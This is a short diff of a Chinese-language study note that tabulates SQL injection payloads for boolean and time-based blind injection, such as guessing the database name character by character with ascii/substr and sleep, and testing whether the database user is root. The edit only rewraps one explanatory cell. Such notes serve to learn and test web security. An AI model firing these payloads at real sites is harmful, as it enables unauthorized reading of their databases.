@@ -11,8 +11,8 @@
 | 布尔盲注验证 | ?id=1 and 1=1 --  / ?id=1 and 1=2 --  | 判断页面真假值，确认盲注存在 |
 | 猜数据库名第1位 | ?id=1 and ascii(substr((select database()),1,1))>=100 --  | 用二分法猜解字符的ASCII码，对应字母'd' |
 | 时间盲注验证 | ?id=1 and sleep(3) | 先确认闭合方式，用id=1,id=1',id=1",确定闭合方式，然后根据响应时间确认时间盲注存在 |
-| 时间盲注验证 |?id=1 and if(ascii(substr((select database()),1,1))>=100,sleep(3),sleep(0)) | 用二分法猜解字符的ASCII码,判断延迟是否可控，确认ASCII码,
-中级substr((),1,1)的括号内容可根据想要插叙的参数填写。|
+| 时间盲注验证 |?id=1 and if(ascii(substr((select database()),1,1))>=100,sleep(3),sleep(0)) | 用二分法猜解字符的ASCII码,判断延迟是否可控，
+确认ASCII码, substr((),1,1)的括号内容可根据想要插叙的参数填写。|
 | 猜当前用户 | ?id=1 and if(substring_index(user(),'@',1)='root',sleep(5),0) | 用`if()`把条件真假转化为延迟 |
 
 ## 3. 本次踩坑与修正
